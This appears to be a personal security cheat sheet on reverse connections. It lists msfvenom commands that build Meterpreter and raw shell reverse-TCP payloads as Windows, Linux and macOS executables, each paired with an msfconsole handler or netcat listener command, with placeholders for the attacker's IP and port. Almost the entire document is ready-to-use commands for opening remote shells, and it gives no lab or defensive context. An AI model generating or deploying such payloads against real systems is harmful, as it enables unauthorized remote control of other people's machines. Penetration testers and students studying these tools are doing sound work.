# Security Notes
Documenting my journey in the world of CyberSecurity




##  Reverse Conneciton 

### Meterpreter
**Windows**

MSFVenom Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > payload.exe
```
MSFConsole Listener
```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
```
**Linux**  

MSFVenom Payload
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf
```
MSFConsole Listener
```bash
msfconsole -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
```

**MACOS**

MSFVenom Payload
```bash
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f macho > payload.macho
```

MSFConsole Listener
```
msfconsole -x "use exploit/multi/handler; set payload osx/x64/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
```
### Netcat

**Windows** 

MSFVenom Payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > payload.exe
```
Netcat Listener
```
nc -lvp <Your_Port>
```
**Linux**
 
MSFVenom Payload
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf
```
Netcat Listener
```
nc -lvp <Your_Port>
```
Replace <Your_IP> with your IP address and <Your_Port> with the desired port number for the reverse connection.
